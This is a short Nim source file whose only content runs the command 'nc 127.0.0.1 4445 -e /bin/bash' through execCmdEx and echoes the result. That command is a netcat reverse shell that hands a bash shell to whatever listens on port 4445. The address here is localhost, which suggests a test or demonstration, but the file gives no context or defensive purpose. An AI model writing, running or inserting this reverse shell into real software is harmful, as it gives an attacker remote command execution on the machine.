import std/osproc

var result = execCmdEx("nc 127.0.0.1 4445 -e /bin/bash")
echo "Output: ", result.output
